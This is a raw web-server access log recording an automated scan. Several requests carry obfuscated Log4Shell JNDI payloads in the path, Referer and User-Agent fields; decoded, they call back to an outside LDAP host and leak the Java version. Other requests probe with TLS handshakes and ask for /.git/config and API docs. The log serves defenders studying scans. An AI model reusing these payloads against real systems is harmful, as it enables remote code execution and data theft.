34.68.34.79 - - [16/Feb/2024:04:05:30 +0000] "PUT /${${m0tf:6:l5:-j}${9o:-n}${0i:4i3l:-d}${x7fq:-i}${ch:g:7x9:-:}${30b:-l}${j5w:5:py:-d}${4:1:87y:-a}${t8j:flh:3:-p}${4:8y2t:-:}${91p:-/}${rl:6m:vlxf:-/}${0j:-P}${twah:ox8:-A}${n:-l}${1tkm:5:-0}${ubl:r3:sr:-c}${2ji:p1b:--}${${7e:-s}${9t01:-y}${2x:a9:0:-s}${i:e8f:7qyg:-:}${eryv:-j}${r7:ns8:tne0:-a}${cp4:n:sa:-v}${1:z:-a}${w:-.}${z:qa:-v}${cei:r6ta:cy:-e}${h8p9:y0cb:-r}${gq:1prt:nr:-s}${xp:-i}${tl46:-o}${25r:-n}}${f71p:fgc:-.}${25z9:5ow:-9}${i:r:-0}${b80o:kd69:-1}${ljbz:0:oex:-d}${3ys:-9}${9nkz:cws:u790:-3}${qxd:z:-8}${niy:-c}${rk:f3:-9}${sc6:07:a6c:-0}${qa:w3b:6g8:-b}${uae:5djh:8o:-2}${prvh:kqo:-2}${kj3:d:-d}${r:wg5:3:-b}${tj0:-e}${h:-9}${vu:ldg:r:-d}${3:-f}${r4e:xuq:rx3y:-2}${yiu:i:-2}${1q:-a}${dls:dnl:8z:-b}${ze:-a}${4:dfs:-9}${umo:-4}${4th:-3}${vk:e6d:-c}${x:w:ni:-6}${ct7h:tqx:omuw:-d}${z:fun9:-a}${scth:-b}${9:cuy7:-3}${ilvo:0x9:269:-3}${n:mob:o:-8}${yojv:-f}${8k:xs:-d}${s:g:z7x:-9}${avj:-0}${twnm:kn0d:zj:-e}${1k:qn:n:-2}${q:gh:-a}${v0:0w9b:-.}${52:p3hv:pn14:-z}${54vz:zgv0:-.}${9o:6:2y:-7}${z:s48b:-b}${j:t05w:4dm:-a}${iq:-e}${l1u:oue:-.}${t4:6zj:-x}${1:h:ey:-y}${g6y:qnl:-z}} HTTP/1.1" 404 207 "-" "${${d:u:-j}${ec6:-n}${x9d8:-d}${t:m:-i}${d0q8:-:}${4ezk:-l}${n1:-d}${f:4:-a}${odf:vn:oypv:-p}${nfgs:-:}${w7ox:2o:-/}${v8u:o7:l:-/}${5b:8avf:-U}${n4u:u796:pymo:-A}${8jl7:-l}${1zn:i1e:v9l:-0}${f8:f:ea:-c}${p:i8:097:--}${${s6:tpy:-s}${s9:ix:0rig:-y}${pef:u5g:-s}${8xh2:j:-:}${wfrl:ioy:-j}${c:g8n:-a}${5:6bf:yxf:-v}${em:-a}${8cr:j0:n:-.}${5:0:-v}${7v5:2c:-e}${oic:zxm:8dfa:-r}${2tqd:z:-s}${wp:f:-i}${5:w7x8:-o}${fq:ysiu:-n}}${lxt:z6sp:-.}${je:h:ojg:-9}${lbd:y:-0}${y:mq:-1}${7rd:zo:fioh:-d}${d5cf:70t:57:-9}${njg:f:-3}${o6pj:9x:2:-8}${a9d:g:p:-c}${axvg:lmik:-9}${am:j39y:-0}${2:qi6:-b}${yvxh:4zg:-2}${iy:-2}${fv:-d}${c:8:91e:-b}${8jv4:gl3r:-e}${fxg:y:-9}${xgk:yva:-d}${t:gskc:vm6i:-f}${j4:8:-2}${l:ft6:-2}${moy:y7:-a}${jus:v4j3:tq:-b}${d:e:8:-a}${7:q:-9}${k3a:-4}${xv:f7qb:mh:-3}${zxr:5ob:nl:-c}${i4:0:-6}${fj:4:s:-d}${en:-a}${gm:z:-b}${pw:-3}${3g0:-3}${g:g9:-8}${c:h:-f}${e4:5:-d}${s9cv:s:-9}${a:-0}${jq4f:-e}${o1:950:-2}${tv:-a}${og:z3c2:364:-.}${pun:3:-z}${jt:-.}${rlv:n:q3:-7}${mjd8:kw:3ws:-b}${70wt:-a}${x9:ls:bi:-e}${h2k:-.}${4957:ze:x3:-x}${4k8:-y}${jwuv:-z}}"
34.68.34.72 - - [16/Feb/2024:04:05:30 +0000] "GET /docs HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:05:30 +0000] "GET /swagger/ui/index HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:05:30 +0000] "\x16\x03\x03\x03\x8F\x01\x00\x03\x8B\x03\x03e\xCE\xDF" 400 150 "-" "-"
34.68.34.66 - - [16/Feb/2024:04:05:31 +0000] "\x16\x03\x01\x01\x12\x01\x00\x01\x0E\x03\x03e\xCE\xDF" 400 150 "-" "-"
34.68.34.66 - - [16/Feb/2024:04:05:31 +0000] "GET /swagger/v1/swagger.json HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.72 - - [16/Feb/2024:04:05:31 +0000] "GET /graphql HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:05:31 +0000] "\x16\x03\x01\x01\xE4\x01\x00\x01\xE0\x03\x03\xB0\x94\xEB`d7\xDBF\x0B\xB5\x8B\xE3\x96\xE1>\xB3\x02\xB3\xB8\xEF\x1B\xD2GT~;c%\x9Eg\x14W \x83\xAFz\xD3\x13\xC4\xE50\xCD\xFF\xE6\x82\x9F\xA8;\xB5\xEE\xBB\x5C\xA3\xB2\xBF\x0C\x19D\xBC\xD7\xA1\xDDR\xCF\xE3\x00\xC8\x13\x02\x13\x03\x13\x01\xC0,\xC00\x00\xA3\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0\xAF\xC0\xAD\xC0\xA3\xC0\x9F\xC0]\xC0a\xC0W\xC0S\x00\xA7\xC0+\xC0/\x00\xA2\x00\x9E\xC0\xAE\xC0\xAC\xC0\xA2\xC0\x9E\xC0\x5C\xC0`\xC0V\xC0R\x00\xA6\xC0$\xC0(\x00k\x00j\xC0s\xC0w\x00\xC4\x00\xC3\x00m\x00\xC5\xC0#\xC0'\x00g\x00@\xC0r\xC0v\x00\xBE\x00\xBD\x00l\x00\xBF\xC0" 400 150 "-" "-"
34.68.34.79 - - [16/Feb/2024:04:05:31 +0000] "GET / HTTP/1.1" 404 207 "${${ltp:s:-j}${p90:nm8t:-n}${g03:4te1:hrg:-d}${r9e:5:-i}${us:o:-:}${qa9:-l}${6ej:o25h:-d}${h3i:6mf:o:-a}${v04:71:gt:-p}${dnm:rmb3:r:-:}${38o7:9bp:-/}${i:k:-/}${oj7s:-R}${l:4td7:-E}${v:1b:x4y:-l}${h01:-0}${r:-c}${ca:7es:--}${${qoeu:-s}${hnrp:-y}${8:-s}${ux:7:w1jc:-:}${p8nx:zg7k:9l:-j}${r:d9r:-a}${vbf:k:eq5:-v}${h45:-a}${5y:-.}${qr2i:-v}${89q0:qmw1:0p1:-e}${j1yi:-r}${s:0:-s}${uy:w:si:-i}${dv:a37:b:-o}${n9d2:81:sri:-n}}${rn2:w:z5li:-.}${re2:p3:-4}${bmi2:-2}${g3d:0v:-d}${zgi:8:l:-3}${r:tzm:-c}${2:-8}${pb9:4pj:-9}${u:1:0am:-d}${x9i1:n1:-6}${reuz:k3i:oxg:-8}${zp:ao:-0}${dpf8:m:-1}${t:-f}${b:7n:a7:-3}${n0s3:gm:-1}${7ga:k:-4}${oe8:txo:2:-4}${4:t:i:-0}${9:n6:-8}${l:rvd:-5}${6w8:43hx:elp:-f}${w:kvy:rbn:-b}${57:w:e:-a}${0si:m48n:z:-8}${qp:-2}${0v94:k21:-a}${a:7xw2:-5}${pra:3u9x:-1}${mltr:ywhk:-1}${f:-4}${q:-b}${tky:-d}${yac1:a:5:-3}${uqr4:-3}${mup:-8}${uk:-f}${rf6e:-d}${8:qzs:5:-9}${dv:-0}${ps:8:24lh:-e}${k:sbxk:-2}${7ryd:s2a:-a}${1:03nr:u:-.}${cw:qn:l:-z}${zme:s:-.}${j:-7}${f:qm3:-b}${n1:-a}${e:78m:-e}${ixpv:xr:9:-.}${035y:2c9w:-x}${34sl:so:-y}${pcl:-z}}" "${${s:-j}${vpw:-n}${glcq:7:-d}${ea:pm:-i}${f:bn3:t:-:}${xeh:q:-l}${uj:-d}${y91:ur6n:-a}${rwc:-p}${so:29:2:-:}${tj:k8:-/}${4ht:u54h:twdx:-/}${o:z:3ws:-U}${htl:7:-A}${jr2c:y897:-l}${pin:p:-0}${6cri:t56o:-c}${zkw4:l:13lj:--}${${p5:a:l:-s}${m3:-y}${9a:-s}${e0u:a:-:}${o9y:fug2:-j}${p54:qc:-a}${3:-v}${qceu:ni:9:-a}${7bp:x3w:-.}${g4zy:mtdu:ih2:-v}${vqs:o:-e}${ph:-r}${edlc:4pen:9a:-s}${4g:-i}${a8dw:-o}${1:3rvx:-n}}${mvo:exu:-.}${7q9n:bw:r8xo:-4}${h6:k31:p0:-2}${zw9:1kvj:sv2:-d}${j:d:w45:-3}${lup:-c}${1sm6:pe:4:-8}${t:-9}${94bk:r:e:-d}${8:-6}${82a:1ioz:q96t:-8}${zd:3:-0}${jo9:90uq:-1}${39o:s:dzb:-f}${45:-3}${h:-1}${q3:-4}${6k:-4}${xc:0luw:-0}${nm76:16:-8}${4ulw:is:w0k:-5}${u:-f}${m:fc3:egpj:-b}${d:0we:-a}${5gr8:-8}${15j:14:b:-2}${ab:r:-a}${dzc:o:-5}${g:y:-1}${2g:34s:-1}${4cfz:d05:lhnr:-4}${pmr8:rn25:1jm3:-b}${23eb:u:3ta:-d}${uv:3:-3}${tusk:e6b:hfj:-3}${p1m:dz5k:-8}${qb5:q96o:-f}${x:nj:e:-d}${a:-9}${z04:jd:ft:-0}${xjvc:zqf:h:-e}${j4:-2}${yx:ud:sd:-a}${n9s4:-.}${mn3:-z}${tyw:i:s5o:-.}${y9:ayuv:-7}${4v:0xl:ah:-b}${s7e:hplg:-a}${i6ma:t8:-e}${rm9:guns:-.}${94lk:-x}${5nm6:w:iq:-y}${cz:h8b0:-z}}"
34.68.34.72 - - [16/Feb/2024:04:05:31 +0000] "GET /doesntexist-21111355 HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:05:32 +0000] "GET /v1/swagger.json HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:05:32 +0000] "\x16\x03\x01\x00\xC7\x01\x00\x00\xC3\x03\x01\xEB\xEA7m\x81\x02\x11\xA1\xCD\xC7\xF5\xAD\xD1\xCE5\x00\xBB\xDF\x8B\xF6\xE0\x16\xAA\x14\x86\xBC\xAB\x0C\xFE\x99\xAB.\x00\x00F\xC0" 400 150 "-" "-"
34.68.34.66 - - [16/Feb/2024:04:05:32 +0000] "\x16\x03\x01\x00\xC8\x01\x00\x00\xC4\x03\x01s\x86m\xF2\xF7`\xF9\xD0\xE4\xA5^qU\x19C\xC5\x91\x1D\x97\xB3\xC6#\xAF\x1C\xD5\xBBo\x90Tv\xBEc\x00\x00F\xC0" 400 150 "-" "-"
34.68.34.79 - - [16/Feb/2024:04:05:32 +0000] "GET / HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:05:32 +0000] "\x804\x01\x00\x02\x00\x1B\x00\x00\x00\x10\x05\x00\x80\x03\x00\x80\x01\x00\x80\x07\x00\xC0\x08\x00\x80\x06\x00@\x04\x00\x80\x02\x00\x80\x00\x00\x00\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09" 400 150 "-" "-"
34.68.34.72 - - [16/Feb/2024:04:05:32 +0000] "GET /def-21111355-doesntexist HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:05:33 +0000] "\x16\x03\x01\x01\xE4\x01\x00\x01\xE0\x03\x03\x9E\xFE\x8A\xC0V\xC8\xC0\xB7\x94\x87\xD2/\x0E\x1B;\xC7KF\xB5{3\xA6\xD5Gj\xE7\x5C\xD7@\x98\xC5\x0E O\xFEH\xE5\xCF\xF4J\x94k\x8D\x97z\x8EfP\x84\x9E\xB4\xD8\xA0Yy\x01\xC2\xD1" 400 150 "-" "-"
34.68.34.66 - - [16/Feb/2024:04:05:33 +0000] "\x16\x03\x00\x00\xE8\x01\x00\x00\xE4\x03\x00" 400 150 "-" "-"
34.68.34.66 - - [16/Feb/2024:04:05:33 +0000] "\x16\x03\x01\x01w\x01\x00\x01s\x03\x03\xF3\xFE\xDD\x87b\xCC\x12\xE2\xD2\x0B6v\x10\xCB\xB0\xE7\xF2\xFC+\xF6\x1C\x09e\x81\xA8:\x94\x14" 400 150 "-" "-"
34.68.34.66 - - [16/Feb/2024:04:05:33 +0000] "\x16\x03\x01\x03\x82\x01\x00\x03~\x03\x01e\xCE\xDF" 400 150 "-" "-"
34.68.34.72 - - [16/Feb/2024:04:05:33 +0000] "GET /.git HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.79 - - [16/Feb/2024:04:05:33 +0000] "GET / HTTP/1.1" 400 150 "-" "-"
34.68.34.66 - - [16/Feb/2024:04:05:34 +0000] "\x16\x03\x01\x00\xC7\x01\x00\x00\xC3\x03\x02\xE1\xC9\x8C^\xFF\xB0\xD9\x98/\xCF\xB4\xC9N\xE3\xB6\xE1>c\x08Y\xFA\x929\x88\xAA\x14\x94\xB0\xCCe\xED\xDB\x00\x00F\xC0" 400 150 "-" "-"
34.68.34.66 - - [16/Feb/2024:04:05:34 +0000] "\x16\x03\x02\x03\x82\x01\x00\x03~\x03\x02e\xCE\xDF" 400 150 "-" "-"
34.68.34.66 - - [16/Feb/2024:04:05:34 +0000] "\x16\x03\x00\x00i\x01\x00\x00e\x03\x03U\x1C\xA7\xE4random1random2random3random4\x00\x00\x0C\x00/\x00" 400 150 "-" "-"
52.91.231.239 - - [16/Feb/2024:04:05:34 +0000] "GET / HTTP/1.1" 404 207 "-" "Typhoeus - https://github.com/typhoeus/typhoeus"
34.68.34.66 - - [16/Feb/2024:04:05:34 +0000] "\x16\x03\x01\x00\xC7\x01\x00\x00\xC3\x03\x01\x7F8\x00\x8C\x7F\xADg\xCB~<\x05\xEF\xF1Ee\xD7\xBD\xBDf\xCA7^\x0E&lT\xD4\x87\x9B\xDB&<\x00\x00F\xC0" 400 150 "-" "-"
34.68.34.66 - - [16/Feb/2024:04:05:34 +0000] "\x16\x03\x03\x03\x82\x01\x00\x03~\x03\x03e\xCE\xDF\x0EZ\xEF\x10\xA9N\x10BCE1s\xDD;R\xA4w4s\xD5\x11,\x94\x06\xAC'\xB57F \x19\xD6h\xE0\x0E\xF7\x99z\x02\x18\xCB\x14\xF98\xFC\xAE\xEFY-I\xE8z^\xE3\xE0\x9B\x8F}\xDB\xBC\xC0\x17\x02\xB2\x00\x00\x00\x01\x00\x02\x00\x03\x00\x04\x00\x05\x00\x06\x00\x07\x00\x08\x00\x09\x00" 400 150 "-" "-"
34.68.34.79 - - [16/Feb/2024:04:05:34 +0000] "POST / HTTP/1.1" 404 207 "${${30fi:gp7h:v5w:-j}${p1:al5p:cl:-n}${7vcp:gwej:c0:-d}${d:i1jq:ug:-i}${v:-:}${dw:w49a:-l}${w4f:-d}${a:03:-a}${lua:-p}${6saq:-:}${m0:6fp:0k:-/}${ughv:0wla:-/}${f3:iqkr:-R}${uj93:-E}${2:4:-l}${8nq:v:rs1:-0}${r:-c}${dft9:--}${${it8:07yd:-s}${a:-y}${0:qe3p:o:-s}${5ont:xj8r:a6ys:-:}${v:-j}${uzc:gl2:50b:-a}${z:86an:ceti:-v}${7jf3:0d:-a}${3g:f7:-.}${g:-v}${ib:p91u:vl57:-e}${xn:1n:14yf:-r}${ytk1:-s}${fck:-i}${x:-o}${l:-n}}${ruk:vo:s:-.}${w3:h0:-4}${i:-2}${3:y:qk5x:-d}${30r:cs:t6nk:-3}${1:c:czm:-c}${sd1m:dhl4:kq:-8}${02m:qr4:-9}${hsku:-d}${xd6:wk:-6}${bc:-8}${u:-0}${m:-1}${o:iyum:jit2:-f}${b:-3}${6nt:6w:-1}${8l1:h3o:-4}${oes:-4}${1:w:5nir:-0}${es2:-8}${mq:o:re1:-5}${96o:-f}${1yt:ac6:-b}${txhy:7ql:2zr:-a}${jd:-8}${6:tu:mpf:-2}${5:1n:sa:-a}${e9:-5}${41v6:mi9h:g:-1}${2ha:t:d:-1}${xbm:4p:-4}${13hk:w7:-b}${o:-d}${ur:rj:-3}${g:-3}${0ki:-8}${v9:3vst:3sy:-f}${h:1q:3czw:-d}${jn6:-9}${7s:e:w:-0}${5i:-e}${grq:j9il:d4:-2}${j7:-a}${5ej0:-.}${jis:ys7g:-z}${zr:jr5p:3o:-.}${nh:5ig:-7}${q5x8:df:-b}${q0n:9:-a}${fm:-e}${1gm:fu:-.}${z7kv:d6:gfoi:-x}${l:ik9w:-y}${u2:e3q:-z}}" "${${05:2j:-j}${xs2k:-n}${inrh:-d}${b1hi:3:jsrv:-i}${64kh:4l:-:}${3e:-l}${t180:6:g0:-d}${zjxb:e:7:-a}${um:cw:-p}${6zwy:l:9:-:}${m:-/}${54e6:dq8l:fmc:-/}${3x05:4y1w:-U}${t:0c5d:ze9:-A}${8kmc:do3r:k:-l}${3ziy:-0}${l:-c}${a70:5sl:--}${${x2:-s}${1t:-y}${jnqg:lx95:5:-s}${3:-:}${h:-j}${qgi:-a}${nwlb:do1u:l6:-v}${j:-a}${d:dk3:k:-.}${3:-v}${xt3w:aw:q8:-e}${j:-r}${hxv4:-s}${61b:-i}${lwh:-o}${acod:z:r5z:-n}}${nw8:gtu:2pw:-.}${jh:2l6:gfp9:-4}${usma:ec:5y6s:-2}${9wf:szvx:rs:-d}${geln:-3}${kexw:i1jb:-c}${ltc:jy:q7j6:-8}${rsq:6pr:-9}${jwpy:-d}${dl:c:5e:-6}${e5:-8}${61:-0}${wgv:-1}${ku7:b79:3lev:-f}${3m:5ogw:-3}${rx:f1:b6u:-1}${l:g1:wduf:-4}${yo:-4}${5:7ov:v2:-0}${e:yt:on:-8}${cr0k:4:-5}${r19o:hb8:-f}${7:c:9:-b}${1lh:qnml:o2:-a}${9o:-8}${0ok:86:-2}${rjvs:-a}${j:6stz:-5}${7i4:pm:9x:-1}${fi:-1}${e87:twm:1:-4}${ramx:4:zk:-b}${9y:ef5:02t:-d}${8peg:ag:-3}${ys:efyk:-3}${9fk:oa5v:-8}${dqe:-f}${st3f:-d}${7w:-9}${klb:hox1:-0}${gif:pm:-e}${76dx:i:-2}${63q4:6:-a}${g:u:-.}${lgj0:-z}${4e:w2:g:-.}${kybe:35k:-7}${jv:h:ildt:-b}${5:n96b:uz:-a}${x6s:2z:eawd:-e}${n:-.}${s5a:1:7xut:-x}${yt:-y}${9:-z}}"
34.68.34.66 - - [16/Feb/2024:04:05:35 +0000] "\x16\x03\x01\x01\x05\x01\x00\x01\x01\x03\x03e\xCE\xDF\x0EZ\xEF\x10\xA9N\x10BCE1s\xDD;R\xA4w4s\xD5\x11,\x94\x06\xAC'\xB57F \x19\xD6h\xE0\x0E\xF7\x99z\x02\x18\xCB\x14\xF98\xFC\xAE\xEFY-I\xE8z^\xE3\xE0\x9B\x8F}\xDB\xBC\xC0\x17\x00" 400 150 "-" "-"
34.68.34.72 - - [16/Feb/2024:04:05:35 +0000] "GET /.git/config HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
34.68.34.66 - - [16/Feb/2024:04:05:35 +0000] "\x16\x03\x01\x01\xD7\x01\x00\x01\xD3\x03\x03\xD1\xD1\xB1\xB4:\xAC{\xE9}\x9D\xC0,\xA5H\xC3\xD2d97\xC6\x10\xA7sf\xE1m%\x0F\xAF\x00\xE8\xF1 d\xDD\xDA|\x81\xF9\xE2\x1D\xDE\xD1\x8F\xC1\xD5\xC7\xE1?^|\x92\x97o\xE6\xD3\x19k\xB9M\xD0\xC5Y\x187\x00\xC8\x13\x02\x13\x03\x13\x01\xC0,\xC00\x00\xA3\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0\xAF\xC0\xAD\xC0\xA3\xC0\x9F\xC0]\xC0a\xC0W\xC0S\x00\xA7\xC0+\xC0/\x00\xA2\x00\x9E\xC0\xAE\xC0\xAC\xC0\xA2\xC0\x9E\xC0\x5C\xC0`\xC0V\xC0R\x00\xA6\xC0$\xC0(\x00k\x00j\xC0s\xC0w\x00\xC4\x00\xC3\x00m\x00\xC5\xC0#\xC0'\x00g\x00@\xC0r\xC0v\x00\xBE\x00\xBD\x00l\x00\xBF\xC0" 400 150 "-" "-"
34.68.34.79 - - [16/Feb/2024:04:05:35 +0000] "GET /${${o:4t:-j}${xjw:90:o23:-n}${p:7r3:s:-d}${pd:-i}${8:x7:c:-:}${un3:0ogr:jia:-l}${kdf:t9z:7sq:-d}${fe6:8po:-a}${b:o:-p}${kra:-:}${oeyw:-/}${f:g6:-/}${61q9:mwe:-P}${k:-A}${u2:c05q:-l}${ma:ed:bzdw:-0}${2:n:9:-c}${jaz:68b1:--}${${mpt1:yp:z1xm:-s}${65:5g1p:-y}${go:sh5g:-s}${lugd:hle:w9p7:-:}${vat3:m:-j}${sf:dg1:-a}${27n0:p:m1d:-v}${u532:-a}${fv5:71t:-.}${7:-v}${zj:s7:tr:-e}${9:-r}${u:a:vg:-s}${fj:5v:-i}${4v:fk:-o}${hx:gp:fa:-n}}${l:-.}${4ix:pf0q:7dfz:-4}${3i:auw7:-2}${n:8:lad:-d}${ec:m6:-3}${c6hu:1f2:8naj:-c}${yk:w:-8}${jwad:b2ml:i:-9}${ki:1wz:is20:-d}${9yh6:vt:-6}${id:cg73:-8}${yl0b:-0}${pxf:p2:2huv:-1}${dhn:6ha:1ve:-f}${frv0:5kp:-3}${4:t:-1}${iexm:q:6:-4}${5hli:4:jli0:-4}${gd:-0}${8:f1:de:-8}${cou3:h:0k:-5}${qj:j:-f}${1:-b}${t:8oyc:-a}${j1yr:h:-8}${p:-2}${49mp:q:xfj:-a}${5:4y:rl:-5}${ots:y:im7:-1}${b:h:-1}${2tq:-4}${n8dw:0a1:v75:-b}${a:-d}${m:gx:-3}${apz:-3}${3:kn1:z:-8}${z:zm6q:ia:-f}${lh:rij4:-d}${r:-9}${vk46:d:-0}${h:xfov:qb2a:-e}${e:8st:-2}${1v:-a}${wj35:-.}${xei:1rfn:-z}${yv8:7w:cib:-.}${u4:3e:ld:-7}${q:-b}${4d:-a}${a1h2:bsg:-e}${blhg:z:-.}${ko3p:-x}${l3:x:-y}${yg:vac8:278:-z}} HTTP/1.1" 404 207 "-" "${${9yv4:-j}${2qpr:5hi7:-n}${ha:5aqg:c:-d}${p6un:-i}${v:dso:x:-:}${g:-l}${6:f:c:-d}${x:-a}${9cu:i:vd:-p}${c:-:}${2l4p:9:el:-/}${7l:z:r79e:-/}${v:6:-U}${3:moh6:ira:-A}${wap:-l}${vxh:qzk:1b:-0}${t:wb86:-c}${o78:atod:--}${${38ji:-s}${9fd:k:-y}${i:1:-s}${sr:n1w:20a:-:}${qfl3:v:-j}${lsj:-a}${ato:-v}${2yao:-a}${rz6:h:-.}${nz5q:8:z9a:-v}${ubr:m:-e}${2ne:-r}${unxy:x:-s}${bivy:wd:-i}${otsj:e:-o}${x:t:kom:-n}}${p:-.}${z0s:w:-4}${35:aczk:-2}${fdys:-d}${d:mo4:-3}${n87:-c}${6l:pn:-8}${0y:0uc:-9}${mow:f:-d}${h:eg:q2j:-6}${hr3j:1te:-8}${2:zsxk:5v:-0}${0:-1}${j:a:vd:-f}${b73c:jz:-3}${0i1:o:59:-1}${n:msdq:-4}${3:9cm:ypa2:-4}${l:duol:-0}${0b:6jc:-8}${gn0:cf6:5:-5}${x:7:-f}${vm:eam:v3t:-b}${izw:ac:cbgl:-a}${facb:-8}${y9:y:4:-2}${sv:l:p7:-a}${3wm:m3:tc2x:-5}${e:38:9h:-1}${z6u:-1}${i:0:-4}${v:03:-b}${x:-d}${y:6h15:-3}${w:-3}${8:wq:5p1b:-8}${c0va:a98:-f}${x:w:-d}${8l:f:z:-9}${o:9:hs:-0}${k:a53x:-e}${62x:r3f6:-2}${lj:hmvu:-a}${4g85:bud:qxb:-.}${jq:fij2:-z}${sa:6qo:-.}${7uz4:-7}${ghe3:-b}${z:-a}${4:mpf:-e}${jhif:9zgu:-.}${p:v2i:-x}${vg:4eq:-y}${l:uyqd:7c:-z}}"
34.68.34.66 - - [16/Feb/2024:04:05:36 +0000] "\x16\x03\x01\x00\xBA\x01\x00\x00\xB6\x03\x01\x1E4\xA3\xF8g\xA8\x16\x9B\x0C'\xF5\xDCU\x1F8MG\xCA\xFE\x88\xC7\x1C>\x02\xCC\x96\xF0%Q\x00\x93;\x00\x00F\xC0" 400 150 "-" "-"
34.68.34.72 - - [16/Feb/2024:04:05:36 +0000] "GET /.hg HTTP/1.1" 404 207 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
